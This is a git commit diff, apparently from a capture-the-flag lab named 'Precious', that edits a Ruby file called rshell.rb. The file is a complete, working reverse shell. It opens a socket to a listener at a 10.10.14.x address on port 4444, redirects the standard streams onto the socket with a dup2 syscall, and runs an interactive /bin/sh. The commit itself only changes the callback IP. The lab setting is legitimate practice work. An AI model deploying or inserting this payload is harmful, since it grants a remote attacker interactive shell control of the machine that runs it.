8007c555db48ed1715a56502ef96dfa9602211e5
stdmedoth_kali <jovictor210@gmail.com>
2023-01-07 18:01:41 -0300

    precious root

--- Precious/pasta_teste/rshell.rb
+++ Precious/pasta_teste/rshell.rb
@@ -6,7 +6,7 @@
 require 'socket'
 
 s = Socket.new 2,1
-s.connect Socket.sockaddr_in 4444, '10.10.14.168'
+s.connect Socket.sockaddr_in 4444, '10.10.14.46'
 
 [0,1,2].each { |fd| syscall 33, s.fileno, fd }
 exec '/bin/sh -i'
